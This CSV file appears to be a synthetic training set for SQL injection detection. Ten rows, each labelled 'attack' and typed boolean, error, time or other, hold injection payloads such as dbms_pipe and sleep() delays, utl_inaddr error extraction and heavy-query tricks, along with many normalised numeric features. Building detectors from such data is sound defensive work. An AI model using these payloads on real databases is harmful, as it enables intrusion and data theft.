id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",nearest_attack_euclidean,R003290,4.649190862589188,150.19102478027344,72.60723114013672,23.563339233398438,73.76749420166016,-0.6417604684829712,40.3385009765625,34.073143005371094,1.0008745193481445,0.37259167432785034,0.07108297199010849,0.39749208092689514,0.13759659230709076,3.6380538940429688,0.11452104151248932,0.7483517527580261,0.627617597579956,-0.047568172216415405,0.16370588541030884,-0.0350172184407711,8.751749038696289,7.507272720336914,1.9256218671798706,-0.001322188414633274,1.0088411569595337,-0.0991697683930397,-0.031406220048666,0.06963826715946198,-0.3024849593639374,-0.07420668751001358,0.03212456405162811,-0.03431814908981323,0.3236880302429199,0.05833987146615982,-0.4011562168598175,1.0016417503356934,7.937472820281982,-0.34646478295326233,1.035894513130188,-0.13335834443569183,-0.08679119497537613,0.49065521359443665,0.032690905034542084,-0.050050850957632065,-0.021083204075694084,0.016402961686253548,-0.03418254479765892,0.2396460920572281,0.33875739574432373,0.41082584857940674,0.37979966402053833,0.582264244556427,0.037339817732572556,-0.015041003003716469,-0.04802950471639633,-0.02744142711162567,0.0711217075586319,0.1670152097940445,0.006718995049595833,0.25543808937072754,-0.006693998817354441,-0.024789828807115555,0.003739503677934408,0.10588151961565018,-0.06067245453596115,-0.08731377869844437,0.14667122066020966,-0.05686500295996666,0.08545493334531784,-0.007353786379098892,-0.015811385586857796,-0.0075592417269945145,0.003578007221221924,0.04981385916471481,0.012988787144422531,-0.06102752313017845,0.8384730815887451,-0.40241044759750366,-0.009626941755414009,0.3053874671459198,-0.03300384804606438,3.4495739936828613,0.47556886076927185,0.12349154055118561,0.04454074054956436,0.1346065104007721,0.03603370860219002,0.15611417591571808,0.024213196709752083
GAN_000002,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R004001,6.22805515541604,248.14064025878906,93.64500427246094,35.40586471557617,159.03970336914062,0.5534682273864746,56.27434539794922,54.5565299987793,1.0012049674987793,0.45504599809646606,0.1027844250202179,0.4562947750091553,0.20081885159015656,3.6565279960632324,0.9471570253372192,0.14074143767356873,2.577741861343384,-0.021319687366485596,0.15331029891967773,0.011012144386768341,9.762811660766602,10.556696891784668,1.9900773763656616,0.002118885051459074,2.1587016582489014,0.05641760304570198,-0.03971056640148163,-0.05405299365520477,1.192193627357483,-0.19777895510196686,0.05335935577750206,0.07900427281856537,-0.4606819450855255,-0.16217674314975739,0.572826087474823,2.2661147117614746,7.437506675720215,-0.020469706505537033,1.889298677444458,0.05641074478626251,0.6350056529045105,1.1397984027862549,0.15984374284744263,-0.2826274037361145,-0.0792715772986412,-0.026309099048376083,-0.08744240552186966,0.5397034883499146,0.5279660224914551,0.49775180220603943,0.7229465842247009,0.7882001399993896,-0.6050705313682556,-0.11658554524183273,0.05892351642251015,0.009586070664227009,-0.043263860046863556,-0.00463187275454402,-0.028055604547262192,0.3744860291481018,-0.004427448380738497,0.12275508046150208,0.0008051204495131969,0.8178685307502747,0.018396224826574326,-0.034891996532678604,-0.08039301633834839,-0.29451924562454224,0.728864312171936,0.0021686230320483446,0.020849427208304405,0.0013525536051020026,0.00722881592810154,0.0863112285733223,0.005706082563847303,0.07098298519849777,-0.3868872821331024,0.07541310787200928,-0.0064954375848174095,0.15471166372299194,-0.22291673719882965,6.7000298500061035,0.5290970206260681,0.03526072949171066,-0.08155153691768646,0.05166110023856163,0.018284043297171593,-0.3511424958705902,0.04009835049510002
GAN_000003,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R004039,9.408526180299305,5.691391944885254,43.6950798034668,11.197011947631836,127.0279541015625,3.3517396450042725,50.00986099243164,19.654081344604492,0.9998661875724792,0.44900670647621155,-0.10060352087020874,0.5240080952644348,0.05249038711190224,3.442415237426758,-0.7960159778594971,4.0133490562438965,-0.13487644493579865,0.3629678785800934,0.2753462493419647,0.004222085699439049,1.0330772399902344,9.19384765625,0.9388679265975952,0.07623416185379028,1.6909364461898804,0.21361401677131653,-0.056262511759996414,-0.4559115469455719,-0.9935824871063232,0.25598785281181335,-0.08708515018224716,-0.021989325061440468,0.7012506723403931,0.04756244271993637,0.49309462308883667,1.173845648765564,4.838724136352539,2.71066951751709,0.388182133436203,-0.01274976134300232,0.33425310254096985,-0.16968286037445068,1.9816160202026367,0.06386686116456985,0.23726488649845123,0.08271344751119614,0.11306629329919815,-0.18174196779727936,-0.01854776404798031,0.2937758266925812,0.34745270013809204,-0.6349173188209534,0.5566660761833191,-0.03487100452184677,-0.05594741553068161,0.1188613623380661,0.0937926322221756,-0.2605092525482178,-0.013434494845569134,-0.728367269039154,0.009932666085660458,-0.11387607455253601,0.009296861477196217,1.218650460243225,-0.15593166649341583,-0.09068229794502258,-0.16475991904735565,-0.25258126854896545,-0.12596140801906586,0.02229982614517212,-0.039130497723817825,0.011890307068824768,0.009173668920993805,0.052468668669462204,-0.017601437866687775,-0.1106875091791153,1.7781461477279663,1.1357589960098267,-0.021138131618499756,0.7668343782424927,0.1749241203069687,-0.550471842288971,1.008338451385498,0.011920101009309292,2.4632792472839355,0.056214265525341034,-0.05494840070605278,0.29350072145462036,-0.012676717713475227
GAN_000004,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,2.887429792626851,126.60061645507812,50.40839385986328,9.24428939819336,59.39995574951172,-0.8618165254592896,37.09199905395508,26.726594924926758,1.0000272989273071,0.38867777585983276,0.0709359422326088,0.37363797426223755,0.18226934969425201,3.4294164180755615,2.9478492736816406,0.5280675292015076,0.2220313996076584,-0.11521108448505402,0.1295222043991089,0.011914144270122051,6.296229362487793,5.773462295532227,2.16121506690979,0.027372917160391808,1.1885473728179932,-0.003043262753635645,-0.01691070944070816,-0.1317058950662613,0.10997553914785385,-0.06387604027986526,0.01630522683262825,0.01855313964188099,-0.17995265126228333,-0.03330831229686737,-0.06040611118078232,0.9848304986953735,3.98897385597229,1.255700707435608,0.8310102224349976,-9.778168896446005e-05,-0.023255327716469765,0.2308093160390854,0.043601714074611664,-0.05642760917544365,-0.020175429061055183,0.009087517857551575,-0.009819366037845612,-0.014171978458762169,0.06791172921657562,0.03659053519368172,0.09854792803525925,0.08798930048942566,0.26384875178337097,-0.03149988502264023,-0.019715001806616783,-0.006275733467191458,0.009280902333557606,0.13291242718696594,0.01620194874703884,0.18102222681045532,-0.0004368168592918664,-0.005347546190023422,0.006771320477128029,0.6416653394699097,-0.07347988337278366,-0.07349003851413727,-0.03669726476073265,0.04377560690045357,-0.043938614428043365,0.0004292269586585462,0.00295231188647449,-0.003253233851864934,0.0022229438181966543,0.005874874535948038,-0.0040945629589259624,-0.015065723098814487,0.6255204677581787,-0.0968853235244751,-0.005991761106997728,0.3118351995944977,-0.04923378303647041,1.9592655897140503,0.6348004937171936,-0.021406300365924835,-0.0637369304895401,-0.02361278235912323,0.0368436835706234,-0.2708694040775299,0.011409761384129524
GAN_000005,attack,other,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',nearest_attack_euclidean,R004710,7.132055181447856,127.16830444335938,49.24176025390625,12.889666557312012,-22.436851501464844,-3.2302401065826416,16.357261657714844,5.371054649353027,0.9981598258018494,0.37038978934288025,0.06882810592651367,0.4412859380245209,0.20029279589653015,3.3514339923858643,3.8934521675109863,-1.612267255783081,1.9580514430999756,0.1019519791007042,0.08212301135063171,-0.03887050971388817,3.7545180320739746,1.160358190536499,-0.6966038346290588,-0.04730765148997307,1.9481827020645142,-0.12162646651268005,0.04609009996056557,-0.2659221291542053,1.7745696306228638,0.8160601854324341,0.038452886044979095,0.04976183548569679,-0.3187354505062103,0.25531208515167236,0.555911660194397,1.610046148300171,1.454461932182312,0.7390727400779724,1.8152439594268799,-0.2619171440601349,0.39036089181900024,0.7137066721916199,0.08367346227169037,-0.08601018041372299,-0.1372823864221573,-0.011445647105574608,-0.046006616204977036,0.9647414088249207,0.9453283548355103,0.903579592704773,0.6364721655845642,1.8717626333236694,0.04697367176413536,0.13741762936115265,-0.08139127492904663,-0.06849934905767441,0.05568001791834831,-0.14553381502628326,0.04357942193746567,0.2364884316921234,0.004524486139416695,0.42176929116249084,-0.008124006912112236,0.6640784740447998,0.23254793882369995,0.0901559591293335,-0.18798130750656128,0.31585028767585754,0.0672716349363327,-0.007883887737989426,0.008064606226980686,-0.010960584506392479,-0.004109713714569807,0.0766168013215065,0.008113701827824116,0.012239457108080387,0.14539489150047302,0.08985364437103271,0.018727125599980354,-0.2491198033094406,-0.005770690273493528,10.923050880432129,0.5507510304450989,0.20629797875881195,0.00918488297611475,0.053954001516103745,0.051382869482040405,0.06890686601400375,0.036856759339571
GAN_000006,attack,boolean,"1   )    )    as spdf where 8554  =  8554 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R004450,3.78409532622828,170.819091796875,54.848060607910156,35.96198272705078,92.38362884521484,-1.7133845090866089,40.29301452636719,27.824548721313477,0.9999684691429138,0.3860180675983429,0.20182517170906067,0.413320392370224,0.1181541159749031,3.6454689502716064,-0.22784875333309174,0.38942140340805054,2.883669376373291,0.024694770574569702,0.018184512853622437,-0.014200786128640175,7.517007827758789,8.687357902526855,2.0388402938842773,-0.002827506046742201,2.1245598793029785,0.03710172325372696,-0.04729335382580757,0.24194175004959106,1.0786610841751099,0.2087426781654358,-0.02765033207833767,0.07110573351383209,-0.4262448251247406,-0.13043633103370667,1.09933340549469,1.8288543224334717,3.9205539226531982,-0.10484085977077484,0.7462754249572754,0.0011532006319612265,0.6368488669395447,0.49842584133148193,-0.00029790864209644496,-0.07690928131341934,-0.02760155312716961,-0.06154853478074074,-0.04236200079321861,0.22812508046627045,0.12312734872102737,-0.04892776533961296,0.08780397474765778,0.17681412398815155,-0.13802827894687653,-0.04725771024823189,0.016267957165837288,0.007397104520350695,-0.008855502121150494,0.11461988836526871,-0.007617415394634008,0.18484440445899963,0.003835449693724513,-0.059181537479162216,0.0012319049565121531,1.314496397972107,0.05298537015914917,0.019993606954813004,-0.10376317799091339,-0.010045486502349377,-0.018728846684098244,0.0015286470297724009,0.04668649658560753,0.0007488240953534842,0.000612435454968363,-0.024070734158158302,-0.009398791939020157,0.016940606757998466,0.34807780385017395,0.4550430476665497,0.002169267972931266,-0.018946925178170204,-0.08074682950973511,4.85716438293457,1.0022716522216797,-0.04234149307012558,0.06182035058736801,-0.08444482833147049,0.031685709953308105,-0.32977157831192017,-0.0026960629038512707
GAN_000007,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,5.607329968650426,14.078652381896973,31.35480308532715,3.743051290512085,29.334604263305664,-1.668953776359558,22.970314025878906,6.051750183105469,0.9988925457000732,0.42673367261886597,0.004646312911063433,0.4807131290435791,0.05727322772145271,3.404343605041504,0.345649391412735,0.5471557378768921,0.9441236257553101,0.9421653747558594,0.09152023494243622,0.01721511036157608,1.8336588144302368,4.1618475914001465,0.6336516737937927,0.00930657610297203,0.7504698038101196,0.10748040676116943,0.04954555630683899,0.32897457480430603,-0.7662326097488403,1.0267295837402344,-0.08509349077939987,0.0969041958451271,-0.46631941199302673,-0.04548274725675583,1.1692020893096924,0.31499195098876953,2.359616994857788,1.1488758325576782,0.4776962101459503,0.025008276104927063,-0.05539561063051224,0.8088923692703247,0.594158411026001,0.0673852264881134,0.12607017159461975,-0.0193936787545681,-0.026126258075237274,0.24397572875022888,-0.013644492253661156,0.03945775702595711,-0.13366374373435974,-0.06868065893650055,-0.017315220087766647,-0.02367647923529148,0.02847142703831196,0.035455480217933655,0.05846235528588295,-0.1077968180179596,-0.0026369274128228426,-0.5679125785827637,0.003990453667938709,-0.2856592833995819,-0.013141453266143799,0.13032281398773193,0.08100520819425583,-0.009904840029776096,-0.07481147348880768,-0.24973170459270477,-0.6984757781028748,0.0065826717764139175,0.016214629635214806,0.01083457376807928,0.000653320224955678,-0.016745487228035927,-0.004367616027593613,0.024027567356824875,-0.22216066718101501,1.924277901649475,-0.005706391297280788,0.09517856687307358,0.04144404083490372,1.5570441484451294,1.086853265762329,-0.15208591520786285,0.7026998400688171,-0.0906432643532753,-0.0025976323522627354,-0.29594555497169495,-0.021009132266044617
GAN_000008,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R006818,5.17375275345845,85.11578369140625,39.58771514892578,12.444397926330566,16.30059814453125,-6.201258659362793,30.947410583496094,3.0990209579467773,0.9993771910667419,0.38773855566978455,-0.009099651128053665,0.5478924512863159,0.03842044994235039,3.460317373275757,2.5155365467071533,-0.7523027658462524,-0.03706200048327446,0.49383169412612915,-0.15301699936389923,-0.0316016860306263,5.335611820220947,4.412328720092773,2.1654486656188965,-0.020864488556981087,1.4160888195037842,-0.04118196293711662,-0.02620130218565464,0.8396921157836914,0.3473357856273651,0.2873203754425049,0.009591343812644482,0.03678033873438835,-0.2129025161266327,0.015594130381941795,0.4320627748966217,0.8737058043479919,1.6906676292419434,0.7636255025863647,-0.02658577635884285,-0.10722710192203522,0.005928536877036095,0.3858465552330017,0.11396407335996628,0.19238345324993134,0.08945299685001373,-0.011372802779078484,-0.0027472262736409903,0.28038519620895386,0.1676599532365799,-0.17109636962413788,-0.0883190706372261,0.16706117987632751,0.44119003415107727,0.038944851607084274,-0.001532323774881661,-0.007596853654831648,0.07669755071401596,0.18237319588661194,0.034171756356954575,-0.2121351659297943,0.009818428196012974,-0.3844873905181885,-0.006812025792896748,1.5662819147109985,0.06049894168972969,0.010154969058930874,-0.09302523732185364,-0.12150344997644424,-0.5123342275619507,0.007001218385994434,0.045976147055625916,0.002796717919409275,-0.0058449446223676205,-0.0592709556221962,-0.007684397976845503,0.0073916674591600895,1.2981393337249756,0.375144898891449,0.003669372294098139,-0.023191677406430244,0.0792682021856308,3.5915873050689697,0.7836787104606628,0.029598303139209747,0.3769063949584961,-0.004693828523159027,-0.002534805331379175,0.12442217022180557,-0.020056208595633507
GAN_000009,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,3.817545346275242,103.26242065429688,31.465253829956055,11.417501449584961,28.476055145263672,0.9248716235160828,30.989015579223633,13.760319709777832,0.999681830406189,0.39114806056022644,0.170095294713974,0.2574946880340576,0.11954986304044724,3.3395307064056396,-0.45938369631767273,0.27737152576446533,0.9296747446060181,0.6124809384346008,0.052006326615810394,0.04837263002991676,2.789788007736206,1.286195993423462,1.779134750366211,-0.004317494574934244,0.9579508900642395,0.06591292470693588,0.02910635806620121,0.6434428691864014,-0.5805443525314331,0.588618814945221,0.010146752931177616,0.08082674443721771,-0.3406800329685211,0.1474466174840927,1.2345975637435913,0.8577494621276855,1.6105331182479858,-0.02896307036280632,1.1521825790405273,-0.017400920391082764,0.6425498723983765,1.0538482666015625,-0.07966262847185135,0.02278711646795273,0.0531807579100132,0.03495609760284424,0.004486752208322287,0.06405335664749146,-0.23563076555728912,-0.02180647663772106,-0.15676218271255493,-0.07027044892311096,0.05975363031029701,-0.04587080702185631,0.09617413580417633,0.01228705421090126,0.02831919863820076,0.045680440962314606,-0.023140249773859978,0.13577625155448914,0.0031018774025142193,-0.11755293607711792,-0.003907530102878809,-0.97175133228302,-0.015539276413619518,-0.034251194447278976,0.06469734013080597,-0.15015296638011932,0.09975550323724747,-0.0027535082772374153,0.011262260377407074,0.0029654076788574457,0.0007879722397774458,0.0037314174696803093,0.012322497554123402,0.08474205434322357,-0.18084284663200378,0.6929642558097839,0.0009532952681183815,-0.11235454678535461,0.010486350394785404,2.4103739261627197,0.6706262826919556,-0.05774090439081192,-0.08370085060596466,-0.001618504524230957,0.006307872477918863,-0.21056242287158966,0.019855624064803123
GAN_000010,attack,boolean,"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R006238,3.968462668479536,191.31796264648438,66.92556762695312,28.521743774414062,117.00511932373047,0.4302101135253906,47.080078125,39.31378173828125,1.0004216432571411,0.38961154222488403,0.13335667550563812,0.4229939877986908,0.1647825688123703,3.6566600799560547,1.00677490234375,1.0122398138046265,1.6666203737258911,0.038327038288116455,0.1051083654165268,-0.0028224256820976734,8.04123306274414,9.112927436828613,2.1437766551971436,0.021007172763347626,2.272733211517334,0.033866893500089645,-0.04785266891121864,-0.0021879079286009073,0.7435588240623474,-0.1826397031545639,-0.02065853215754032,0.05254663899540901,-0.2653563916683197,-0.11643747240304947,0.64042067527771,2.0234198570251465,5.067116737365723,0.41751736402511597,1.0952473878860474,-0.012602537870407104,0.7078938484191895,0.5574859976768494,0.045409176498651505,-0.14055578410625458,-0.020121490582823753,-0.02380281314253807,-0.029993437230587006,0.14985068142414093,0.15900658071041107,0.098983034491539,0.2926839292049408,0.24627985060214996,-0.10516461730003357,-0.05545220151543617,0.0380522646009922,0.006378674414008856,-0.03755612671375275,0.06101149693131447,-0.015441305004060268,0.27152472734451294,-0.00033615357824601233,0.00981108471751213,0.005833461415022612,1.101142168045044,-0.014763171784579754,-0.028699448332190514,-0.03669322654604912,-0.19733871519565582,0.23470544815063477,0.0021722870878875256,0.019838867709040642,0.0008929548203013837,0.005439710337668657,0.01654933951795101,-0.004710650537163019,0.014896039851009846,0.5168285965919495,-0.007349404040724039,-0.005324489437043667,0.16692094504833221,-0.10883008688688278,4.57504940032959,0.8232986330986023,0.03799726814031601,-0.01185969915241003,-0.024060435593128204,0.022717885673046112,-0.25215792655944824,0.02256462536752224
